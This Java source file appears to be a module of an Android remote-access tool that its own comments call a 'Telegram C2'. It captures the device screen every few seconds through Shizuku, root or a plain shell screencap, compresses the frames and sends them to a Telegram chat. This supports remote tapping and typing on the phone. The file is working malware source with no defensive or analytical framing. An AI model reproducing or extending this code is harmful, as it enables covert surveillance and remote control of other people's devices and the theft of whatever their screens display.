package com.java.panel;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;

/**
 * "VNC-lite" for Telegram C2: continuous screenshot stream.
 *
 * Real RFB/VNC over a socket needs a reachable host (breaks pure serverless).
 * This module streams scaled JPEG frames to Telegram on an interval, combined
 * with existing /tap /swipe /type for interactive remote control.
 *
 * Capture backends (in order):
 *  1) Shizuku screencap
 *  2) su screencap
 *  3) fails with clear error
 */
public class VncStreamHelper {

    private static volatile boolean streaming = false;
    private static volatile Thread streamThread = null;
    private static int intervalMs = 3000;
    private static int quality = 40;
    private static int maxWidth = 720;
    private static String activeChatId = "";

    public static boolean isStreaming() {
        return streaming;
    }

    public static String start(Context ctx, String chatId, int intervalSec, int jpegQuality, int width) {
        if (streaming) return "⚠️ Stream already running. /vnc stop first.";
        if (chatId == null || chatId.isEmpty()) return "❌ No chat id";

        if (intervalSec < 2) intervalSec = 2;
        if (intervalSec > 60) intervalSec = 60;
        if (jpegQuality < 15) jpegQuality = 15;
        if (jpegQuality > 90) jpegQuality = 90;
        if (width < 240) width = 240;
        if (width > 1080) width = 1080;

        intervalMs = intervalSec * 1000;
        quality = jpegQuality;
        maxWidth = width;
        activeChatId = chatId;
        streaming = true;

        streamThread = new Thread(() -> {
            int frame = 0;
            File dir = new File(Environment.getExternalStorageDirectory(), "panel/vnc");
            if (!dir.exists()) dir.mkdirs();

            if (ShellService.instance != null) {
                ShellService.instance.sendTelegramMessage(activeChatId,
                        "📺 VNC-lite STARTED\n"
                                + "• Interval: " + (intervalMs / 1000) + "s\n"
                                + "• JPEG quality: " + quality + "\n"
                                + "• Max width: " + maxWidth + "px\n"
                                + "• Control: /tap /swipe /type /back /home\n"
                                + "• Stop: /vnc stop");
            }

            while (streaming) {
                try {
                    frame++;
                    File raw = new File(dir, "raw.png");
                    File out = new File(dir, "frame.jpg");
                    if (raw.exists()) raw.delete();
                    if (out.exists()) out.delete();

                    boolean ok = captureScreen(raw.getAbsolutePath());
                    if (ok && raw.exists() && raw.length() > 0) {
                        boolean scaled = scaleToJpeg(raw, out, maxWidth, quality);
                        File sendFile = scaled && out.exists() ? out : raw;
                        if (ShellService.instance != null) {
                            // Reduce chat spam: caption only every 10 frames
                            if (frame == 1 || frame % 10 == 0) {
                                ShellService.instance.sendTelegramMessage(activeChatId,
                                        "📺 frame #" + frame + " (" + (sendFile.length() / 1024) + " KB)");
                            }
                            ShellService.instance.sendFileToTelegram(sendFile.getAbsolutePath(), activeChatId);
                        }
                    } else {
                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(activeChatId,
                                    "❌ Frame #" + frame + " capture failed (need Shizuku or root for screencap)");
                        }
                        // Don't spin forever on hard failure
                        if (frame >= 2) {
                            streaming = false;
                            break;
                        }
                    }

                    long sleep = intervalMs;
                    long start = System.currentTimeMillis();
                    while (streaming && System.currentTimeMillis() - start < sleep) {
                        Thread.sleep(200);
                    }
                } catch (InterruptedException ie) {
                    break;
                } catch (Exception e) {
                    if (ShellService.instance != null) {
                        ShellService.instance.sendTelegramMessage(activeChatId, "❌ Stream error: " + e.getMessage());
                    }
                    try { Thread.sleep(1000); } catch (Exception ignored) {}
                }
            }

            streaming = false;
            if (ShellService.instance != null) {
                ShellService.instance.sendTelegramMessage(activeChatId, "⏹ VNC-lite STOPPED");
            }
        });
        streamThread.setDaemon(true);
        streamThread.start();
        return "✅ VNC-lite starting…";
    }

    public static String stop() {
        if (!streaming) return "ℹ️ Stream was not running.";
        streaming = false;
        try {
            if (streamThread != null) streamThread.interrupt();
        } catch (Exception ignored) {}
        return "⏹ VNC-lite stop requested.";
    }

    public static String status() {
        return "📺 VNC-lite\n"
                + "• Running: " + (streaming ? "YES" : "NO") + "\n"
                + "• Interval: " + (intervalMs / 1000) + "s\n"
                + "• Quality: " + quality + "\n"
                + "• Max width: " + maxWidth + "px\n"
                + "• Note: needs Shizuku or root (screencap). Use /tap /swipe with frames.";
    }

    private static boolean captureScreen(String path) {
        // 1) Shizuku
        try {
            Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
            Method newProcessMethod = shizukuClass.getDeclaredMethod(
                    "newProcess", String[].class, String[].class, String.class);
            newProcessMethod.setAccessible(true);
            Process process = (Process) newProcessMethod.invoke(null,
                    new String[]{"sh", "-c", "screencap -p '" + path + "'"}, null, null);
            if (process != null) {
                process.waitFor();
                File f = new File(path);
                if (f.exists() && f.length() > 0) return true;
            }
        } catch (Exception ignored) {}

        // 2) Root
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p " + path});
            process.waitFor();
            File f = new File(path);
            if (f.exists() && f.length() > 0) return true;
        } catch (Exception ignored) {}

        // 3) Plain shell (usually fails without privilege)
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", "screencap -p " + path});
            process.waitFor();
            File f = new File(path);
            if (f.exists() && f.length() > 0) return true;
        } catch (Exception ignored) {}

        return false;
    }

    private static boolean scaleToJpeg(File png, File jpg, int maxW, int q) {
        try {
            BitmapFactory.Options opts = new BitmapFactory.Options();
            opts.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(png.getAbsolutePath(), opts);
            int w = opts.outWidth;
            int h = opts.outHeight;
            if (w <= 0 || h <= 0) return false;

            int sample = 1;
            while (w / sample > maxW * 2) sample *= 2;

            opts.inJustDecodeBounds = false;
            opts.inSampleSize = sample;
            Bitmap bmp = BitmapFactory.decodeFile(png.getAbsolutePath(), opts);
            if (bmp == null) return false;

            if (bmp.getWidth() > maxW) {
                float ratio = (float) maxW / bmp.getWidth();
                int nh = Math.round(bmp.getHeight() * ratio);
                Bitmap scaled = Bitmap.createScaledBitmap(bmp, maxW, nh, true);
                if (scaled != bmp) {
                    bmp.recycle();
                    bmp = scaled;
                }
            }

            FileOutputStream fos = new FileOutputStream(jpg);
            bmp.compress(Bitmap.CompressFormat.JPEG, q, fos);
            fos.flush();
            fos.close();
            bmp.recycle();
            return jpg.exists() && jpg.length() > 0;
        } catch (Exception e) {
            return false;
        }
    }
}
